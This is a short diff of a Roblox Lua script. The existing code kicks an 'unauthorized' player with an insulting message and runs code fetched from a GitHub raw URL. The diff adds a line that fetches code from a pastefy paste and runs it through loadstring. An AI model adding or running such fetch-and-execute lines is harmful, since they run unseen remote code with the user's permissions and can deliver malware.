@@ -32,3 +32,5 @@ else
 game.Players.LocalPlayer:Kick("Unauthorized access. Don't try skidding again, MF.")
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Ngigerngieofoepdo/WhoExecutedHolder/refs/heads/main/GatosSkidChecker"))()
 end
+
+loadstring(game:HttpGet("https://pastefy.app/VCVehBWE/raw"))()
